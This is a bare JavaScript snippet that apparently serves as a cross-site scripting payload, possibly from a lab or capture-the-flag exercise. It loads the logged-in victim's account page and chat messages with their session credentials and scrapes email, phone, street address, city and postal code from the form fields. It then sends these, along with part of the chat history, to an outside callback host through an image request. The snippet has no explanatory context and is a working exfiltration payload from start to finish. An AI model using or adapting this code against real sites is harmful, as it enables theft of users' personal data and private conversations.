fetch('/account/',{credentials:'include'}).then(r=>r.text()).then(a=>{
  const v=n=>(a.match(new RegExp('name="'+n+'"[^>]*value="([^"]*)"','i'))||[])[1]||'';
  fetch('/api/more_messages/',{credentials:'include'}).then(r=>r.text()).then(chat=>{
    new Image().src='https://q9fpgq7v.instances.httpworkbench.com/x?'+encodeURIComponent(JSON.stringify({
      email:v('email_change'), phone:v('e_phone_number'),
      addr:v('e_address'), city:v('e_city'), zip:v('e_zip'),
      chat:chat.slice(0,1500)
    }));
  });
});
